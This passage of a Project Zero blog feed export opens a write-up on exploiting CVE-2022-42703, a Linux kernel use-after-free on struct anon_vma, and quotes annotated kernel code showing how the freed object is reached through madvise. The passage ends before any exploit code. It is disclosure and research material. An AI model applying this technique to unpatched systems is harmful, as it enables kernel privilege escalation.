doesn&amp;rsquo;t that still leave the chosen prefix attack? Maybe, but that&amp;rsquo;s something to explore another time. Or maybe (hopefully) Apple will remove SHA1 support in their signature blobs and there will be nothing to explore at all.&lt;/span&gt;&lt;/p&gt;\n &lt;p class=\"wUhACgDjbS-c1 wUhACgDjbS-c12\"&gt;&lt;span class=\"wUhACgDjbS-c6\"&gt;&lt;/span&gt;&lt;/p&gt;"},"link":[{"@rel":"replies","@type":"application/atom+xml","@href":"https://googleprojectzero.blogspot.com/feeds/3562308922263769538/comments/default","@title":"Post Comments"},{"@rel":"replies","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/01/der-entitlements-brief-return-of.html#comment-form","@title":"0 Comments"},{"@rel":"edit","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3562308922263769538"},{"@rel":"self","@type":"application/atom+xml","@href":"https://www.blogger.com/feeds/4838136820032157985/posts/default/3562308922263769538"},{"@rel":"alternate","@type":"text/html","@href":"https://googleprojectzero.blogspot.com/2023/01/der-entitlements-brief-return-of.html","@title":"DER Entitlements: The (Brief) Return of the Psychic Paper"}],"author":{"name":"Google Project Zero","uri":"http://www.blogger.com/profile/08975904405228580347","email":"noreply@blogger.com","gd:image":{"@rel":"http://schemas.google.com/g/2005#thumbnail","@width":"16","@height":"16","@src":"https://img1.blogblog.com/img/b16-rounded.gif"}},"media:thumbnail":{"@xmlns:media":"http://search.yahoo.com/mrss/","@url":"https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEh_ctQx4QBRr-XKiIsWHuUO3d6r1cbG935MHyu2EXDNwm1tWeaGC1A5yniZErHOJ8qqwg185tDe6tU4u8ObWuPf-0CnLI9Pk5QhdQBOKcK6YAzqg30Xz1cuDtkcX9ryZ70vGbk3JKVwwkB0ozGkW6jqEIl-Q7jpeQZTM0PXmGtbsB7g1ApOut3xBwOX/s72-c/image2.png","@height":"72","@width":"72"},"thr:total":"0"},{"id":"tag:blogger.com,1999:blog-4838136820032157985.post-2515628030502752973","published":"2022-12-08T11:04:00.000-08:00","updated":"2022-12-08T11:04:18.790-08:00","title":{"@type":"text","#text":"Exploiting CVE-2022-42703 - Bringing back the stack attack"},"content":{"@type":"html","#text":"&lt;p&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-style: italic; white-space: pre-wrap;\"&gt;Seth Jenkins, Project Zero&lt;/span&gt;&lt;/p&gt;&lt;span id=\"docs-internal-guid-80db8a65-7fff-c0a2-2d4d-7a9f80d725d3\"&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;This blog post details an exploit for &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/list?q=label:CVE-2022-42703\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: green; font-family: Roboto, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;CVE-2022-42703&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; (P0 &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2351\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;issue 2351&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; - Fixed 5 September 2022), a bug Jann Horn found in the Linux kernel's memory management (MM) subsystem that leads to a use-after-free on &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;. As the bug is very complex (I certainly struggle to understand it!), a future blog post will describe the bug in full. For the time being, the &lt;/span&gt;&lt;a href=\"https://bugs.chromium.org/p/project-zero/issues/detail?id=2351\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;issue tracker entry&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;, &lt;/span&gt;&lt;a href=\"https://lwn.net/Articles/383162/\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;this LWN article&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; explaining what an &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; is and &lt;/span&gt;&lt;a href=\"https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=7a3ef208e662f\" style=\"text-decoration-line: none;\"&gt;&lt;span style=\"color: #1155cc; font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; text-decoration-line: underline; text-decoration-skip-ink: none; vertical-align: baseline; white-space: pre-wrap;\"&gt;the commit&lt;/span&gt;&lt;/a&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; that introduced the bug are great resources in order to gain additional context.&lt;/span&gt;&lt;/p&gt;&lt;h2 dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 6pt; margin-top: 18pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 16pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 400; vertical-align: baseline; white-space: pre-wrap;\"&gt;Setting the scene&lt;/span&gt;&lt;/h2&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;Successfully triggering the underlying vulnerability causes &lt;/span&gt;&lt;span style=\"background-color: #b4a7d6; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;folio-&amp;gt;mapping&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; to point to a freed &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; object. Calling &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;madvise(..., MADV_PAGEOUT)&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;can then be used to repeatedly trigger accesses to the freed &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; in &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;folio_lock_anon_vma_read()&lt;/span&gt;&lt;span style=\"font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;:&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct anon_vma *folio_lock_anon_vma_read(struct folio *folio,&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&amp;nbsp; struct rmap_walk_control *rwc)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;{&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct anon_vma *anon_vma = NULL;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;struct anon_vma *root_anon_vma;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;unsigned long anon_mapping;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;rcu_read_lock();&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_mapping = (unsigned long)READ_ONCE(&lt;/span&gt;&lt;span style=\"background-color: #b4a7d6; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;folio-&amp;gt;mapping&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if ((anon_mapping &amp;amp; PAGE_MAPPING_FLAGS) != PAGE_MAPPING_ANON)&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;goto out;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if (!folio_mapped(folio))&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;goto out;&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;// anon_vma is dangling pointer&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"background-color: cyan; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; = (struct anon_vma *) (anon_mapping - PAGE_MAPPING_ANON);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;// root_anon_vma is read from dangling pointer&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"background-color: #f6b26b; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;root_anon_vma&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt; = READ_ONCE(&lt;/span&gt;&lt;span style=\"background-color: cyan; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;anon_vma&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&amp;gt;root);&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if (&lt;/span&gt;&lt;span style=\"background-color: #ea9999; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;down_read_trylock&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;(&amp;amp;&lt;/span&gt;&lt;span style=\"background-color: #f6b26b; font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;root_anon_vma&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;-&amp;gt;rwsem)) {&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if (!folio_mapped(folio)) { &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;\"&gt;// false&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;[...]&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;goto out;&lt;/span&gt;&lt;/p&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;}&lt;/span&gt;&lt;/p&gt;&lt;br /&gt;&lt;p dir=\"ltr\" style=\"line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;\"&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;&lt;span class=\"Apple-tab-span\" style=\"white-space: pre;\"&gt;\t&lt;/span&gt;&lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;\"&gt;if (rwc &amp;amp;&amp;amp; rwc-&amp;gt;try_lock) { &lt;/span&gt;&lt;span style=\"font-family: &amp;quot;Courier New&amp;quot;; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: 